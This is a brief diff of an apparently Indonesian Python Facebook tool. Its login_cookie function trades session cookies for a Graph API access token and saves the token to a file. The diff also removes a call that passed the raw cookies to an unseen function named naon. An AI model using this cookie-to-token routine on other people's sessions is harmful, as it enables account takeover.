@@ -201,7 +201,7 @@ def login_cookie():
 						r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site'})
 						response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 						access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-						print(f"{garis} token : {H} {access_token}");open("token.txt","w").write(access_token);naon(your_cookies)
+						print(f"{garis} token : {H} {access_token}");open("token.txt","w").write(access_token)
 					else:
 						print(f'{garis} Gagal Coy...');exit()
 		except (ConnectionError, ChunkedEncodingError):
